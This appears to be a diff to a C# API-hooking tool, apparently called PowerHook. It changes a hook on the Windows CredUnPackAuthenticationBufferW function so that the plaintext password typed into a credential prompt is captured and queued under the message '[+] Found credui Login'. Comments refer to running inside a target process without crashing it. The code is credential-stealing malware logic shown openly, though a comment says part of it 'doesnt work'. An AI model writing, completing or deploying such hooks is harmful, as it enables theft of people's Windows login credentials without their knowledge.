@@ -253,27 +253,33 @@ namespace PowerHook
            [MarshalAs(UnmanagedType.LPWStr)] String pszPassword, 
            ref uint pcchMaxPassword)
         {
+            bool result = false;
+            result = CredUnPackAuthenticationBufferW(dwFlags, out pAuthBuffer, cbAuthBuffer, pszUserName, ref pcchMaxUserName, pszDomainName, ref pcchMaxDomainName, pszPassword, ref pcchMaxPassword);
+            
             try
             {
+                
                 lock (this._messageQueue)
                 {
                     if (this._messageQueue.Count < 1000)
                     {
-                      
-                        String Data = pszUserName;
+
+                        //String Data = pszUserName;
 
                         this._messageQueue.Enqueue(
-                        string.Format("[+] Found credui Login --> {0}", Data)); //doesnt work
+                        string.Format("[+] Found credui Login --> {0}", pszPassword)); //doesnt work
 
 
                     }
                 }
+                
+                
             }
             catch
             {
                 // swallow exceptions so that any issues caused by this code do not crash target process
             }
-            return CredUnPackAuthenticationBufferW(dwFlags, out pAuthBuffer, cbAuthBuffer, pszUserName, ref pcchMaxUserName, pszDomainName,ref pcchMaxDomainName, pszPassword, ref pcchMaxPassword);
+            return result;
         }
 
 
